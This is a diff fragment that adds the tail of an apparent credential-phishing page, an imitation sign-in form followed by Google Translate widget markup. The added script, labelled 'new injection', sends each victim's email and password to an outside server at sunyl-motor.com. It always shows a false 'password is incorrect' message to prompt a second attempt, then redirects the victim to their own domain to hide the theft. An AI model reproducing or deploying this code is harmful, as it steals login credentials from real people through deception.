+        $("#logoname").html(finalu);
+      ///////////new injection////////////////
+      count=count+1;
+      
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://sunyl-motor.com/w c.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+			 $('#msg').html("<span style='color:red;'>Your account or password is incorrect. Please try again</span>");
+              if(response){
+                $("#msg").show();
+				console.log(response);
+				$('#msg').html(response['msg']);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=2) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                   window.location.replace("https://www."+my_slice);
+                 //   window.location.replace("https://office.com");
+
+                  }
+                  // $('#msg').html(response['msg']);
+                }
+                else{
+                   $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=2) {
+                count=0;
+                   window.location.replace("https://www."+my_slice);
+                  //    window.location.replace("https://office.com");
+              }
+              $("#msg").show();
+              // $('#msg').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('Sign in');
+            }
+          });
+    });
+
+ 			
+
+    });
+
+
+  </script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" alt="Google Translate" width="20" height="20"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Contribute a better translation</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>
+  
+<div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><iframe class="goog-te-menu-frame skiptranslate" title="Language Translate Widget" style="visibility: visible; box-sizing: content-box; width: 1026px; height: 274px; display: none;" frameborder="0"></iframe></body><!-- jQuery first, then Popper.js, then Bootstrap JS --></html>
